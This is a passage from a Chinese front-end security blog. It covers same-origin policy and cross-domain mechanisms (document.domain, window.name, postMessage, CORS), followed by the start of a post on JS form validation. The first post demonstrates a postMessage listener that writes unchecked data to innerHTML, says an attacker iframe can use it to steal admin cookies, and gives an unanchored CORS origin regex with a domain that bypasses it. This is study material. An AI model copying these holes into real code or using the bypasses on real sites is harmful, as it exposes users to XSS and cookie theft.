<p><strong>在子窗口去调用父窗口的函数来改变自身窗体的大小。</strong></p>
<p>如果两个网页不同源，就无法拿到对方的DOM。典型的例子是<code>iframe</code>窗口和<code>window.open</code>方法打开的窗口，它们与父窗口无法通信。实验一下</p>
<p>在我的vps写入如下语句<code>&lt;iframe id=&#39;1&#39; src=&#39;http://www.baidu.com&#39;&gt;&lt;/iframe&gt;</code>,百度的页面与我的父窗口是不同源的，接下我来我们试着获取windows对象</p>
<p><img src="https://s2.ax1x.com/2019/07/19/ZjqV74.png" alt="ZjqV74.png"></p>
<p>可以看到由于同源问题我们没法去获得子窗口的contentwindow属性，子窗口无法获得父窗口的dom，父窗口也无法获得子窗口的dom,对于子窗口而言，<code>window.parent.document</code>同样因为同源问题报错,那么只要这两个窗口一级域名一样，二级域名不同，同样可以通过设置document.domain来使得两个页面同源，进而操作dom属性。同样也会产生一些安全问题，如果在页面存在xss漏洞，那么可以威胁到其他设置了document.domain的页面甚至父域。</p>
<p><img src="https://s2.ax1x.com/2019/07/19/Zjq6EQ.png" alt="Zjq6EQ.png"></p>
<p><strong>也就是说如果通过iframe这种方式来引入其他子窗口，那么在设置了document.domain的情况下，很可能实现”跨域攻击”。</strong></p>
<p>document.domain需要注意的一些事情</p>
<ol>
<li>document.domain只可以设置为当前域以及父域。</li>
<li>document.domain赋值后端口会变成NULL,也就是说a.b.com仅凭document.domain赋值为b.com是无法与b.com进行交互的，因为此时端口仍然不同，还是不同源，这样就能避免了子域存在xss漏洞，而对父域造成攻击的影响，但是还是可以影响到其他子域的，例如上面的例子。</li>
</ol>
<h4 id="location-hash跨域"><a href="#location-hash跨域" class="headerlink" title="location.hash跨域"></a>location.hash跨域</h4><p>实例：利用location.hash实现跨域iframe自适应宽高</p>
<p><a href="https://dj4kobe.iteye.com/blog/842322" target="_blank" rel="noopener">https://dj4kobe.iteye.com/blog/842322</a></p>
<p>主要原理，通过location.hash将数据传给与a.html同域名的的c.html,c.html通过两层parent获取a的windows属性，实现自适应高度，比较容易理解使用。</p>
<h4 id="window-name跨域"><a href="#window-name跨域" class="headerlink" title="window.name跨域"></a>window.name跨域</h4><p>window对象有个name属性，该属性有个特征：即在一个窗口(window)的生命周期内,窗口载入的所有的页面都是共享一个window.name的，每个页面对window.name都有读写的权限，window.name是持久存在一个窗口载入过的所有页面中的，并不会因新页面的载入而进行重置。</p>
<p><strong>first_vps/6.html</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">'test'</span> <span class="attr">src</span>=<span class="string">'http://second_vps/2.html'</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">window</span>.name)&lt;<span class="regexp">/scrispt&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><strong>first_vps/5.html</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">alert(<span class="built_in">window</span>.name)</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>second_vps/2.html</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="built_in">window</span>.name = <span class="string">"flag&#123;this_is_test&#125;"</span>;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>首先通过6.html来得到2.html的window.name对象，再通过引入5.html将值打印出。</p>
<p><img src="https://s2.ax1x.com/2019/07/19/ZvFB7R.png" alt="ZvFB7R.png"></p>
<p><strong>这里的载入过页面也就是只经过src引用的5.html和2.html，所以二者共享一个window.name对象，通过alert可将window.name弹出。</strong></p>
<p>安全性思考：敏感信息不应该放在window.name属性中，因为可以通过如上方式，两个窗口的载入，来共享一个window.name，并且获得其值。</p>
<h4 id="PostMessage跨域"><a href="#PostMessage跨域" class="headerlink" title="PostMessage跨域"></a>PostMessage跨域</h4><p>html5引入的message的API可以更方便、有效、安全的解决这些难题。postMessage()方法允许来自不同源的脚本采用异步方式进行有限的通信，可以实现跨文本档、多窗口、跨域消息传递。</p>
<p>postMessage(data,origin)方法接受两个参数</p>
<p> 1.<strong>data</strong>:要传递的数据，html5规范中提到该参数可以是JavaScript的任意基本类型或可复制的对象，然而并不是所有浏览器都做到了这点儿，部分浏览器只能处理字符串参数，所以我们在传递参数的时候需要使用JSON.stringify()方法对对象参数序列化，在低版本IE中引用json2.js可以实现类似效果。</p>
<p>2.<strong>origin</strong>：字符串参数，指明目标窗口的源，协议+主机+端口号[+URL]，URL会被忽略，所以可以不写，这个参数是为了安全考虑，postMessage()方法只会将message传递给指定窗口，当然如果愿意也可以建参数设置为”*”，这样可以传递给任意窗口，如果要指定和当前窗口同源的话设置为”/“。</p>
<p>实验如下</p>
<p>第一个vps上的2.html开启监听</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">'test'</span> <span class="attr">src</span>=<span class="string">"//your_vps/5.html"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(e.data);</span></span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>第二个vps上的5.html传入数据</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    parent.postMessage(<span class="string">'test'</span>,<span class="string">'first_vps/2.html'</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/07/19/ZvVGb4.png" alt="ZvVGb4.png"></p>
<p>成功得到数据，安全性问题(以下例子来自evoA师傅的文章)</p>
<h5 id="事件监听没有判断来源造成的安全问题"><a href="#事件监听没有判断来源造成的安全问题" class="headerlink" title="事件监听没有判断来源造成的安全问题"></a>事件监听没有判断来源造成的安全问题</h5><p>对于如下代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">setcookie(<span class="string">"flag"</span>,<span class="string">"flag&#123;this_is_test&#125;"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;iframe id=<span class="string">'iframe'</span> src=<span class="string">"//True_url/5.html"</span>&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1 id=<span class="string">"name"</span>&gt;&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    window.addEventListener(<span class="string">'message'</span>,<span class="function"><span class="keyword">function</span><span class="params">(e)</span></span>&#123;</span><br><span class="line">        document.getElementById(<span class="string">'name'</span>).innerHTML = e.data;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>对于如上代码，原理是监听True_url下的5.html所发送的数据进行给h1赋值，但是我们可以通过恶意iframe进行引入</p>
<p>创建test.html页面，内容为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe id&#x3D;&#39;test&#39; src&#x3D;&#39;http:&#x2F;&#x2F;120.77.174.89:10080&#x2F;2.php&#39;&gt;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure>

<p>即可进行恶意引入xss进行获得管理员cookie等操作</p>
<p><img src="https://s2.ax1x.com/2019/07/19/ZvQajI.png" alt="ZvQajI.png"></p>
<h5 id="当正则设置有误时，可以通过适当的域名绕过"><a href="#当正则设置有误时，可以通过适当的域名绕过" class="headerlink" title="当正则设置有误时，可以通过适当的域名绕过"></a>当正则设置有误时，可以通过适当的域名绕过</h5><p><img src="https://s2.ax1x.com/2019/07/19/ZvU8sg.png" alt="ZvU8sg.png"></p>
<p>如上是一个简单的过滤样例。</p>
<h4 id="CORS跨域"><a href="#CORS跨域" class="headerlink" title="CORS跨域"></a>CORS跨域</h4><p>CORS是一个W3C标准，全称是”跨域资源共享”（Cross-origin resource sharing）。它允许浏览器向跨源服务器，发出<a href="http://www.ruanyifeng.com/blog/2012/09/xmlhttprequest_level_2.html" target="_blank" rel="noopener"><code>XMLHttpRequest</code></a>请求，从而克服了AJAX只能<a href="http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html" target="_blank" rel="noopener">同源</a>使用的限制。整个CORS通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS通信与同源的AJAX通信没有差别，代码完全一样。浏览器一旦发现AJAX请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。因此，实现CORS通信的关键是服务器。只要服务器实现了CORS接口，就可以跨源通信。</p>
<p>浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。</p>
<p>下面主要说一下<code>simple request</code></p>
<p>简单请求的定义为：</p>
<p>（1) 请求方法是以下三种方法之一：</p>
<ul>
<li>HEAD</li>
<li>GET</li>
<li>POST</li>
</ul>
<p>（2）HTTP的头信息不超出以下几种字段：</p>
<ul>
<li>Accept</li>
<li>Accept-Language</li>
<li>Content-Language</li>
<li>Last-Event-ID</li>
<li>Content-Type：只限于三个值<code>application/x-www-form-urlencoded</code>、<code>multipart/form-data</code>、<code>text/plain</code></li>
</ul>
<p>满足以上条件的为简单请求，不满足的为非简单请求。</p>
<p>当浏览器发现<code>AJAX</code>请求是简单请求，就会自动在头部信息中，添加一个<code>Origin</code>字段，如下：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/cors</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Origin</span>: http://api.bob.com</span><br><span class="line"><span class="attribute">Host</span>: api.alice.com</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0...</span><br></pre></td></tr></table></figure>

<p>服务器会通过Origin的值来判断此次请求是否在允许的范围内，如果不在允许的范围内，服务器返回一个正常的但是没有Access-Control-Allow-Origin的http请求，浏览器通过检测出错误，然后抛出异常，如果在允许的范围内，则会多出如下几下响应头部字段：</p>
<blockquote>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span>: http://api.bob.com</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span>: true</span><br><span class="line"><span class="attribute">Access-Control-Expose-Headers</span>: FooBar</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=utf-8</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</blockquote>
<ul>
<li><strong>Access-Control-Allow-Origin</strong>:该字段为必须值，*的情况下代表接受任意域名的请求。</li>
<li><strong>Access-Control-Allow-Credentials</strong>:布尔值，代表此次请求是否需要cookie</li>
<li><strong>Access-Control-Expose-Headers</strong>：指定额外的header字段，如果请求想要拿取额外指定的header字段，必须添加此形式getResponseHeader(‘test’)，才可以获得test字段的值</li>
</ul>
<p>进行一次实验</p>
<p>2.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Access-Control-Allow-Origin: *"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"You Get it"</span>;</span><br><span class="line"><span class="meta">?&gt;</span>p</span><br></pre></td></tr></table></figure>

<p>test.html</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"loadDoc()"</span>&gt;</span>修改内容<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">'demo'</span>&gt;</span>1<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">loadDoc</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">  <span class="keyword">var</span> xhttp = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="actionscript">  xhttp.onreadystatechange = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">if</span> (<span class="keyword">this</span>.readyState == <span class="number">4</span> &amp;&amp; <span class="keyword">this</span>.status == <span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML =</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.responseText;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"><span class="actionscript">  xhttp.open(<span class="string">"GET"</span>, <span class="string">"http://120.77.174.89:10080/2.php"</span>, <span class="literal">true</span>);</span></span><br><span class="line">  xhttp.send();</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>抓包看一下</p>
<p><img src="https://s2.ax1x.com/2019/07/19/ZvcbJe.png" alt="ZvcbJe.png"></p>
<p>成功看到之前我们所说的Origin与服务器返回的字段。</p>
<p><strong>注意，如果要发送cookie，Access-Control-Allow-Origin就不能设置*，必须要与请求网页的域名一致。</strong></p>
<p>同样存在不正确的正则匹配问题，如下代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/http:\/\/.*\.?test.club/"</span>,getallheaders()[<span class="string">'Origin'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    header(<span class="string">"Access-Control-Allow-Origin: "</span>.getallheaders()[<span class="string">'Origin'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>并未用<code>^和$</code>进行约束，导致可以构造域名绕过，达到跨域访问，例如域名<code>http://test.club.hack.com</code>即可达到攻击目的。</p>
<h4 id="JSONP跨域"><a href="#JSONP跨域" class="headerlink" title="JSONP跨域"></a>JSONP跨域</h4><p>通过<code>script</code>的src属性实现跨域，再加上一个回调函数，返回所得的数据，这里只做大概介绍，下篇文章会详细讲解。</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://evoa.me/index.php/archives/43/" target="_blank" rel="noopener">https://evoa.me/index.php/archives/43/</a></p>
<p><a href="http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html</a></p>
<p><a href="http://www.ruanyifeng.com/blog/2016/04/cors.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2016/04/cors.html</a></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/07/20/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%BA%8C-%E5%90%8C%E6%BA%90%E8%B7%A8%E5%9F%9F%E4%BA%A7%E7%94%9F%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/" data-id="ckabsu396003lkkvr7bzr8x3k" class="article-share-link" data-share="baidu" data-title="前端安全学习笔记(二)-同源跨域产生的安全问题">Share</a>
      

      
        <a href="http://yoursite.com/2019/07/20/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%BA%8C-%E5%90%8C%E6%BA%90%E8%B7%A8%E5%9F%9F%E4%BA%A7%E7%94%9F%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-前端安全学习笔记-一-基础知识" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/20/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="article-date">
  <time datetime="2019-07-20T05:59:19.000Z" itemprop="datePublished">2019-07-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/20/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">前端安全学习笔记(一)-基础知识</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>此篇文章作为前端学习的备忘录，因为不常做开发工作，所以有些知识可能会忘掉，特此记录备忘。</p>
<h3 id="JS验证"><a href="#JS验证" class="headerlink" title="JS验证"></a>JS验证</h3><h4 id="JS表单验证"><a href="#JS表单验证" class="headerlink" title="JS表单验证"></a>JS表单验证</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validateForm</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="built_in">document</span>.forms[<span class="string">"myForm"</span>][<span class="string">"fname"</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (x == <span class="string">""</span>) &#123;</span><br><span class="line">        alert(<span class="string">"必须填写姓名"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form name=<span class="string">"myForm"</span> action=<span class="string">"./index.php"</span> onsubmit=<span class="string">"return validateForm()"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">姓名：&lt;input type=<span class="string">"text"</span> name=<span class="string">"fname"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Submit"</span>&gt;</span><br><span class="line">&lt;<span class="regexp">/form&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="js输入验证"><a href="#js输入验证" class="headerlink" title="js输入验证"></a>js输入验证</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h2&gt;JavaScript 能够验证输入&lt;<span class="regexp">/h2&gt;</span></span><br><span class="line"><span class="regexp">&lt;p&gt;s请输入 1 与 10 之间的数：&lt;/</span>p&gt;</span><br><span class="line"></span><br><span class="line">&lt;input id=<span class="string">"numb"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;bsutton type=<span class="string">"button"</span> onclick=<span class="string">"myFunction()"</span>&gt;提交&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;p id="demo"&gt;&lt;/</span>p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunction</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> x, text;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取 id="numb" 的输入字段的值</span></span><br><span class="line">  x = <span class="built_in">document</span>.getElementById(<span class="string">"numb"</span>).value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果 x 不是数字或小于 1 或大于 10</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">isNaN</span>(x) || x &lt; <span class="number">1</span> || x &gt; <span class="number">10</span>) &#123;</span><br><span class="line">    text = <span class="string">"输入无效"</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    text = <span class="string">"输入有效"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML = text;</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="调用js验证的API"><a href="#调用js验证的API" class="headerlink" title="调用js验证的API"></a>调用js验证的API</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;输入数字并点击提交：&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;input id="id1" type="number" min="100" max="300" required&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;button onclick="myFunction()"&gt;提交&lt;/</span>button&gt;</span><br><span class="line"></span><br><span class="line">&lt;sp&gt;如果该数字小于 <span class="number">100</span> 或大于 <span class="number">300</span>，将显示错误消息。&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;p id="demo"&gt;&lt;/</span>p&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunction</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> inpObj = <span class="built_in">document</span>.getElementById(<span class="string">"id1"</span>);</span><br><span class="line">  <span class="keyword">if</span> (!inpObj.checkValidity()) &#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML = inpObj.validationMessage;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML = <span class="string">"输入有效"</span>;</span><br><span class="line">  &#125; </span><br><span class="line">&#125; </span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="JS对象"><a href="#JS对象" class="headerlink" title="JS对象"></a>JS对象</h3><h4 id="set方法"><a href="#set方法" class="headerlink" title="set方法"></a>set方法</h4><p><img src="https://s2.ax1x.com/2019/07/16/ZbkIC4.png" alt="ZbkIC4.png"></p>
<h4 id="javascript原型继承"><a href="#javascript原型继承" class="headerlink" title="javascript原型继承"></a>javascript原型继承</h4><p>所有 JavaScript 对象都从原型继承属性和方法。</p>
<p>日期对象继承自 Date.prototype。数组对象继承自 Array.prototype。Person 对象继承自 Person.prototype。</p>
<p>Object.prototype 位于原型继承链的顶端：</p>
<p>日期对象、数组对象和 Person 对象都继承自 Object.prototype。</p>
<h4 id="javascript-call方法"><a href="#javascript-call方法" class="headerlink" title="javascript call方法"></a>javascript call方法</h4><p>call() 方法是预定义的 JavaScript 方法。</p>
<p>它可以用来调用所有者对象作为参数的方法。</p>
<p>通过 call()，您能够使用属于另一个对象的方法。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">    fullName: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.firstName + <span class="string">" "</span> + <span class="keyword">this</span>.lastName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> person1 = &#123;</span><br><span class="line">    firstName:<span class="string">"Bill"</span>,</span><br><span class="line">    lastName: <span class="string">"Gates"</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> person2 = &#123;</span><br><span class="line">    firstName:<span class="string">"Steve"</span>,</span><br><span class="line">    lastName: <span class="string">"Jobs"</span>,</span><br><span class="line">&#125;</span><br><span class="line">person.fullName.call(person1);  <span class="comment">// 将返回 "Bill Gates"</span></span><br></pre></td></tr></table></figure>

<p><strong>带参数的call方法</strong></p>
